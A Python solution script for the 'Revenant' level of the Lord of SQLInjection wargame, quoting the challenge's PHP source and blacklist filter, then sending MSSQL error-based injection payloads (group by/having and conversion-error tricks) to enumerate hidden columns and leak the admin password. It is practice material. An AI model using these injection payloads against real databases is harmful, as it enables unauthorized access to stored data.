#!/usr/bin/env python3
import los
from bs4 import BeautifulSoup
import re


def resp(url: str, param: dict, cook: dict, text="select"):
    response = los.get_request(url, param, cook)

    soup = BeautifulSoup(response, 'html.parser')
    war = soup.find_all(string=re.compile(text))
    print(war)


def main():
    '''
    Revenant 42

    if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit("No Hack ~_~");
    if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = "select * from prob_revenant where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    sqlsrv_query($db,$query);
    if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));

    $query = "select * from prob_revenant where id='admin'"; 
    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
    if($result['4'] === $_GET['pw']) solve("revenant"); // you have to pwn 5th column
    '''

    url = "https://los.rubiya.kr/chall/revenant_05b27d7dea5f124118e48899d46e0b5b.php"
    cook = los.check_cookies(url)

    param = dict(
        pw="' group by pw having 1=1--")
    resp(url, param, cook)

    param = dict(
        pw="' group by pw,id having 1=1--")
    resp(url, param, cook)

    param = dict(
        pw="' group by pw,id,[45a88487] having 1=1--")
    resp(url, param, cook)

    param = dict(
        pw="' group by pw,id,[45a88487],[13477a35] having 1=1--")
    resp(url, param, cook)

    param = dict(
        pw="' group by pw,id,[45a88487],[13477a35],[9604b0c8] having 1=1--")
    response = los.get_request(url, param, cook)

    soup = BeautifulSoup(response, 'html.parser')
    war = soup.find_all(string=re.compile("select"))
    print(war)

    param = dict(
        id="admin' and \"9604b0c8\"=1 --")
    resp(url, param, cook, text="Conversion failed")

    param = dict(pw='aa68a4b3fb327dee07f868450f7e1183')
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Revenant Clear!')


if __name__ == '__main__':
    main()
